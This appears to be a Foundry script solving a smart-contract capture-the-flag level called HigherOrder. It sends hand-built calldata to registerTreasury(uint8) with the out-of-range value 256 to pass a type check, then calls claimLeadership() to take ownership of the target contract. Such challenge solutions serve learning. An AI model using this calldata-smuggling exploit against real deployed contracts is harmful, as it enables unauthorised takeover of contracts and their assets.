// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.12;

import {Script, console} from "forge-std/Script.sol";
import {HigherOrder} from "../src/HigherOrder.sol";

contract HigherOrderScript is Script {
    address public target;

    function setUp() public {
        target = 0xe4d9CCfb0c6F1A19A5EE8d525847b9b8858B9872;
    }

    function run() public {
        vm.startBroadcast();

        bytes4 selector = bytes4(keccak256("registerTreasury(uint8)"));
        bytes memory data = abi.encodeWithSelector(selector, uint256(256));

        (bool success, ) = target.call(data);
        require(success, "registerTreasury call failed");

        (bool success2, ) = target.call(
            abi.encodeWithSignature("claimLeadership()")
        );
        require(success2, "claimLeadership failed");

        vm.stopBroadcast();
    }
}
